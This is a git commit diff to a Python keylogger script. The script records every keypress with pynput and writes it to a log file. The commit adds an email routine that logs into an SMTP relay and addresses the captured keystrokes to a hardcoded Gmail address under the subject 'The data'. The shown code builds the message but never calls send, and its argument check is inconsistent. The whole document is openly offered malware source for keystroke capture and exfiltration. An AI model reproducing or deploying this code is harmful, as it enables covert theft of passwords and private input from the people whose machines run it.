1b1c2764a81f7b32c25789fb6f382c9981eec2f6
Larry1011x <60589853+Larry1011x@users.noreply.github.com>
2021-04-20 01:43:12 -0400

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -3,6 +3,11 @@ import os
 import sys
 from pynput.keyboard import Key, Listener
 import logging
+import smtplib
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
 
 my_parser = argparse.ArgumentParser(prog='keylogger',
                                     usage='%(prog)s [options] -f ',
@@ -42,12 +47,32 @@ args = my_parser.parse_args()
 
 def on_press(key):
     logging.info(str(key))
-    
+
+def create_email(args):
+    if args.m and (args.lport is None or args.rport is None):
+        parser.error("/m requires /e and /p.")
+    else:
+        server = smtplib.SMTP('smtp.relay.gmail.com', 25)
+        server.ehlo()
+        server.login(args.e, args.p)
+        msg = MIMEMultipart()
+        msg['From'] = 'A hacker'
+        msg['to'] = 'trance1100@gmail.com'
+        msg['Subject'] = 'The data'
+
+        with open(args.f, 'r') as f:
+            message = f.read()
+        msg.attach(MIMEText(message, 'plain'))
+        
 def keylogger_main(args):
     logging.basicConfig(filename=(args.dir + args.f), \
     level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
     with Listener(on_press=on_press) as listener:
         listener.join()
+    
+    if args.m:
+        create_email(args)
+        
 
 keylogger_main(args)
